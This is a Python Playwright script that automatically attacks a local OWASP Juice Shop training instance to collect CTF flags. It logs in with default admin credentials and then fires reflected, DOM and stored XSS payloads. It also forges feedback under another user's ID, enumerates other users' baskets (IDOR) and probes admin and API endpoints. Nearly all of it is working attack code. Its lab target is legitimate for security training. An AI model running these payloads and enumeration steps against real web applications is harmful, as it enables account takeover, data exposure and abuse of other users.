#!/usr/bin/env python3
"""Juice Shop Browser CTF v2 — real Playwright interactions (click, fill, evaluate, wait)."""
from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeout
import urllib.request, json, time, re

BASE = "http://localhost:3000"
ADMIN_EMAIL = "admin@juice-sh.op"
ADMIN_PASS = "admin123"
PREV_FLAGS = set()

def get_flags():
    resp = urllib.request.urlopen(f"{BASE}/api/Challenges", timeout=10)
    data = json.loads(resp.read()).get("data", [])
    solved = {c["name"] for c in data if isinstance(c, dict) and c.get("solved")}
    return len(solved), solved, data

def show_new(label):
    global PREV_FLAGS
    count, current, _ = get_flags()
    new = current - PREV_FLAGS
    if new:
        print(f"\n  {label} -> {len(new)} NEW FLAGS [{count}/111]:")
        for n in sorted(new):
            print(f"    {n}")
    PREV_FLAGS = current
    return count, len(new)

print("=== Juice Shop Browser CTF v2 ===\n")
_, PREV_FLAGS, _ = get_flags()
print(f"Starting: {len(PREV_FLAGS)}/111")

def dismiss_dialogs(page):
    """Close any overlay dialogs, cookie banners, or popups."""
    for sel in [
        "button[aria-label='Close Welcome Banner']",
        "a.cc-dismiss", "button.close-dialog",
        "aria-label='Close'",
        ".cdk-overlay-container button",
        "button:has-text('Dismiss')", "button:has-text('Close')",
        "button:has-text('Accept')", "button:has-text('Hide')",
        "button:has-text('Got it')", "button:has-text('OK')",
        ".mat-mdc-dialog-surface button",
    ]:
        try: page.click(sel, timeout=1000); page.wait_for_timeout(300)
        except: pass
    try: page.keyboard.press("Escape"); page.wait_for_timeout(300)
    except: pass

with sync_playwright() as p:
    browser = p.chromium.launch(headless=True, args=[
        "--no-sandbox", "--disable-gpu", "--disable-dev-shm-usage",
        "--disable-setuid-sandbox", "--single-process"
    ])
    ctx = browser.new_context(viewport={"width": 1280, "height": 900})
    page = ctx.new_page()
    page.set_default_timeout(10000)

    # 1. Login as admin
    print("\n1. Admin login...")
    page.goto(f"{BASE}/#/login", wait_until="networkidle")
    page.wait_for_timeout(3000)
    dismiss_dialogs(page)
    
    page.fill("input[name=email]", ADMIN_EMAIL)
    page.fill("input[name=password]", ADMIN_PASS)
    page.click("button[type=submit]")
    page.wait_for_timeout(3000)
    dismiss_dialogs(page)
    show_new("Login")

    # 2. Score Board
    print("2. Score Board...")
    page.goto(f"{BASE}/#/score-board", wait_until="networkidle")
    page.wait_for_timeout(2000)
    show_new("ScoreBoard")

    # 3. Administration section
    print("3. Admin section...")
    page.goto(f"{BASE}/#/administration", wait_until="networkidle")
    page.wait_for_timeout(2000)
    show_new("Admin")

    # 4. XSS Reflected
    print("4. XSS Reflected...")
    for payload in [
        "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
        "%3Ciframe%20src%3Djavascript:alert(1)%3E",
        "<svg/onload=alert(1)>",
        "<img src=x onerror=alert(1)>",
        "<body onload=alert(1)>",
    ]:
        try:
            page.goto(f"{BASE}/#/search?q={payload}", wait_until="load")
            page.wait_for_timeout(500)
        except: pass
    show_new("XSS Reflected")

    # 5. XSS DOM
    print("5. XSS DOM...")
    page.evaluate("window.location.hash = '#/search?q=%3Ciframe%20src%3D%22javascript:alert(1)%22%3E'")
    page.wait_for_timeout(1000)
    show_new("XSS DOM")

    # 6. XSS Stored via Feedback
    print("6. XSS Stored...")
    xss_payloads = [
        '<script>alert(1)</script>',
        '<iframe src="javascript:alert(1)">',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
    ]
    for payload in xss_payloads:
        try:
            page.goto(f"{BASE}/#/contact", wait_until="load")
            page.wait_for_timeout(500)
            page.fill("#comment", payload)
            page.wait_for_timeout(200)
            page.evaluate("document.getElementById('rating').value = '5'")
            # Click submit
            page.click("#submitButton", timeout=3000)
            page.wait_for_timeout(1000)
        except: pass
    show_new("XSS Stored")

    # 7. Zero Stars feedback
    print("7. Zero Stars...")
    try:
        page.goto(f"{BASE}/#/contact", wait_until="load")
        page.wait_for_timeout(1000)
        page.fill("#comment", "test zero stars")
        page.evaluate("document.getElementById('rating').value = '0'")
        page.click("#submitButton", timeout=3000)
        page.wait_for_timeout(1000)
    except: pass
    show_new("Zero Stars")

    # 8. Forged Feedback (post as another user)
    print("8. Forged Feedback...")
    try:
        page.evaluate("""fetch('/api/Feedbacks', {method:'POST', headers:{'Content-Type':'application/json'}, 
            body:JSON.stringify({comment:'forged', rating:5, UserId:2})})""")
        page.wait_for_timeout(1000)
    except: pass
    show_new("Forged")

    # 9. Basket manipulation
    print("9. Basket...")
    try:
        page.goto(f"{BASE}/#/basket", wait_until="load")
        page.wait_for_timeout(2000)
    except: pass
    try:
        page.goto(f"{BASE}/#/search", wait_until="load")
        page.wait_for_timeout(1000)
        # Add product to basket
        page.click("button.btn-basket, mat-grid-tile button", timeout=3000)
        page.wait_for_timeout(1000)
        # View basket  
        page.goto(f"{BASE}/#/basket", wait_until="load")
        page.wait_for_timeout(1000)
    except: pass
    show_new("Basket")

    # 10. Other users' baskets (IDOR)
    print("10. IDOR Baskets...")
    for bid in range(1, 6):
        try:
            page.evaluate(f"fetch('/rest/basket/{bid}')")
        except: pass
    page.wait_for_timeout(1000)
    show_new("IDOR")

    # 11. Privacy Policy
    print("11. Privacy...")
    page.goto(f"{BASE}/#/privacy-security/privacy-policy", wait_until="load")
    page.wait_for_timeout(1000)
    try:
        page.click("button[aria-label='Accept'], .accept-btn", timeout=2000)
    except: pass
    show_new("Privacy")

    # 12. Data Export / Erasure
    print("12. Data export...")
    page.goto(f"{BASE}/#/privacy-security/data-export", wait_until="load")
    page.wait_for_timeout(1000)
    page.goto(f"{BASE}/#/privacy-security/erasure-request", wait_until="load")
    page.wait_for_timeout(1000)
    show_new("Data")

    # 13. CSRF via profile change
    print("13. CSRF...")
    try:
        page.goto(f"{BASE}/#/profile", wait_until="load")
        page.wait_for_timeout(1000)
        page.fill("input[name=username]", "csrf_test")
        page.click("button[type=submit], #submit", timeout=3000)
        page.wait_for_timeout(1000)
    except: pass
    show_new("CSRF")

    # 14. 2FA / OAuth
    print("14. 2FA bypass...")
    try:
        page.goto(f"{BASE}/#/2fa/enter", wait_until="load")
        page.wait_for_timeout(1000)
    except: pass
    show_new("2FA")

    # 15. Wallet / payment
    print("15. Wallet...")
    for path in ["/#/wallet", "/#/payment/shop", "/#/deluxe-membership"]:
        try:
            page.goto(f"{BASE}{path}", wait_until="load")
            page.wait_for_timeout(1000)
        except: pass
    show_new("Wallet")

    # 16. Track order
    print("16. Track order...")
    for oid in ["<script>alert(1)</script>", "5267-f9cd5882f54f48a5"]:
        try:
            page.goto(f"{BASE}/#/track-result?id={oid}", wait_until="load")
            page.wait_for_timeout(1000)
        except: pass
    show_new("Track")

    # 17. Complaint
    print("17. Complaint...")
    try:
        page.goto(f"{BASE}/#/complain", wait_until="load")
        page.wait_for_timeout(1000)
        page.fill("textarea", "test complaint")
        page.evaluate("document.querySelector('input[type=file]')")
    except: pass
    show_new("Complaint")

    # 18. Photo wall
    print("18. Photo wall...")
    try:
        page.goto(f"{BASE}/#/photo-wall", wait_until="load")
        page.wait_for_timeout(2000)
    except: pass
    show_new("Photo")

    # 19. Recycle
    print("19. Recycle...")
    try:
        page.goto(f"{BASE}/#/recycle", wait_until="load")
        page.wait_for_timeout(1000)
    except: pass
    show_new("Recycle")

    # 20. About / Easter eggs
    print("20. Easter eggs...")
    for egg in [
        "/#/about", "/#/s3cR37??@!d1r3cT0rY/",
        "/ftp/", "/#/encryption-keys",
    ]:
        try: page.goto(f"{BASE}{egg}", wait_until="load"); page.wait_for_timeout(1000)
        except: pass
    show_new("Easter eggs")

    # 21. Solve challenges via API
    print("21. API challenge solve attempts...")
    page.evaluate("""[
        '/rest/user/login',
        '/api/Feedbacks',
        '/api/Users',
        '/rest/basket/1',
        '/administration',
        '/rest/admin/application-configuration',
    ].forEach(p => fetch(p).catch(() => {}))""")
    page.wait_for_timeout(2000)
    show_new("API sweep")

    # Final count
    count, solved, data = get_flags()
    browser.close()
    print(f"\n{'='*50}")
    print(f"TOTAL FLAGS: {count}/111")
    print(f"New flags this session: {count - len(PREV_FLAGS)}")
    print(f"{'='*50}")
